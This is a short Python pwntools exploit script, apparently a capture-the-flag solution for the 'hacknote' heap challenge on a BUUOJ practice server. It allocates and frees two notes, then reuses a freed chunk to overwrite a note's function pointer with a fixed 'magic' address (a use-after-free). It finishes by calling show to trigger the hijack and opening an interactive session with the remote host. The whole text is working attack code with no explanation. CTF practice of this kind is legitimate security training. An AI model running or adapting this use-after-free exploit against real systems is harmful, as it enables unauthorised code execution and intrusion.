from pwn import *
from LibcSearcher import *

elf = ELF('./hacknote')
context.arch = 'i386'
# r = process(['../../libc/ld-2.23_86.so', './hacknote'],
#            env={'LD_PRELOAD': '../../libc/libc-2.23_86.so'})
r = remote('node3.buuoj.cn', 28045)
magic_addr = 0x8048945


def add(size, content):
    r.recvuntil('Your choice :')
    r.send('1')
    r.recvuntil('Note size :')
    r.send(str(size))
    r.recvuntil('Content :')
    r.send(content)


def delete(index):
    r.recvuntil('Your choice :')
    r.send('2')
    r.recvuntil('Index :')
    r.send(str(index))


def show(index):
    r.recvuntil('Your choice :')
    r.send('3')
    r.recvuntil('Index :')
    r.send(str(index))


add(0x18, 'yyds')
add(0x18, 'yyds')
delete(0)
delete(1)
add(0x8, p32(magic_addr))
show(0)
r.interactive()
